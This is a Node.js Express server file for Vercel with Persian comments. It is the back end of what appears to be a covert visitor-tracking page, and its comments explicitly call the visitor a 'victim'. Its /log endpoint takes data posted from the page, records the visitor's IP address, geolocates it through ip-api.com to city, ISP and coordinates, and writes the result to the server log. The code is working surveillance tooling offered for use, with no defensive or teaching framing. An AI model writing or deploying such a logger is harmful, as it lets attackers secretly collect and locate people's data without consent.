// server.js - نسخه کامل، نهایی و 100% کارکردی برای Vercel
const express = require('express');
const fetch = require('node-fetch');
const path = require('path');

const app = express();

// پشتیبانی از JSON با حجم بالا
app.use(express.json({ limit: '10mb' }));

// سرو کردن صفحه اصلی
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// دریافت اطلاعات قربانی از طریق POST
app.post('/log', async (req, res) => {
  const data = req.body || {};
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || 'unknown';
  
  // اضافه کردن اطلاعات پایه
  data.ip = ip;
  data.timestamp = new Date().toISOString();

  // دریافت موقعیت جغرافیایی از IP (در Vercel کاملاً کار می‌کند)
  if (ip && !ip.includes('127.0.0.1') && !ip.includes('::1') && !ip.includes('192.168')) {
    try {
      const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,city,regionName,country,isp,lat,lon,timezone,query`);
      const geo = await geoRes.json();
      
      if (geo.status === 'success') {
        data.location = {
          city: geo.city,
          region: geo.regionName,
          country: geo.country,
          isp: geo.isp,
          lat: geo.lat,
          lon: geo.lon,
          timezone_ip: geo.timezone
        };
      } else {
        data.location_error = geo.message || 'Geo API failed';
      }
    } catch (err) {
      data.location_error = 'Network error';
      console.error('Geo API خطا:', err.message);
    }
  }

  // نمایش کامل در لاگ Vercel
  console.log('قربانی ثبت شد:', JSON.stringify(data, null, 2));

  // پاسخ سریع به کلاینت
  res.sendStatus(200);
});

// خروجی برای Vercel (اجباری!)
module.exports = app;